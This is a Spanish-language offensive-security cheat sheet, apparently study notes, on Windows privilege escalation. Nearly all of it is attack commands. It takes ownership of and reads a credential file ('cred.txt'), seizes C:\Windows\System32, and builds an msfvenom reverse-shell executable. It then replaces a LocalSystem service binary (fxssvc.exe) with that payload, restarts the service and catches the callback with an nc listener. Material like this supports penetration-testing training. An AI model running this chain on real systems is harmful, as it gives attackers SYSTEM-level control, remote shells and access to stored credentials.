TakeOwnership

Permite modificar permisos de directorios

En caso de recibir access denied podemos modificar los permisos para leer o escribir directorios y archivos

PowerShell: Modificar propietario y permisos

takeown /f 'C:\Department Shares\Private\IT\cred.txt'
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant Everyone:F
type 'C:\Department Shares\Private\IT\cred.txt'

Binary Hijacking

CMD: Buscar Servicios Privilegiados -> SERVICE_START_NAME: LocalSystem

# Listar servicios
wmic service list brief # CMD
services # PowerShell

# Escoger Servicios SERVICE_START_NAME: LocalSystem (SYSTEM ) y StartMode: Manual
# Ej. service_name = Fax
sc.exe qc Fax
Get-WMIObject -Class win32_service | Where-Object {$_.Name -eq Fax} | Select-Object *

# Tiene el PathName C:\Windows\system32\fxssvc.exe

PowerShell: Convertirnos en propietario y cambiar permisos para poder escribir y leer en el directorio

takeown /f 'C:\Windows\System32' # Convertirnos en propietarios
icacls 'C:\Windows\System32' /grant user:F  # Dar permisos completos
# F: Todos los permisos
cacls 'C:\Windows\System32' /grant user:F  # Ver Permisos

Kali: Payload

msfvenom -p windows/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 -f exe > rev.exe

PowerShell: Reemplazar binario por payload

mv C:\Windows\system32\fxssvc.exe C:\Windows\system32\fxssvc.exe.back
copy rev.exe C:\Windows\system32\fxssvc.exe

CMD: Reiniciar el servicio. Se debe producir un fallo al reiniciar

sc.exe stop <service_name>
net stop <service_name> # Alternativa
sc.exe start <service_name>
net start <service_name> # Alternativa

Kali: Listener

rlwrap nc -nlvp 443
